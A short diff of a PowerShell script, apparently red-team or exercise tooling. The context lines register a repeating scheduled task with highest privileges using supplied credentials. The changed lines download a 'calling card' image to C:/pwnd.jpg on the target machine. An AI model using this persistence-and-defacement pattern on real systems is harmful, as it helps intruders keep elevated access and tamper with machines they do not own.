@@ -18,6 +18,6 @@ $trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).Date -RepetitionInterva
 Register-ScheduledTask -TaskName $jobname -Action $action -Trigger $trigger -RunLevel Highest -User $username -Password $password -Settings $settings
 
 # Download and place calling card
-$cardurl = ""
-$carddest = ""
+$cardurl = "https://vignette.wikia.nocookie.net/warhammer40k/images/e/e7/Genestealer_Cultists_rise.jpg/"
+$carddest = "C:/pwnd.jpg"
 (New-Object System.Net.WebClient).DownloadFile($cardurl, $carddest)
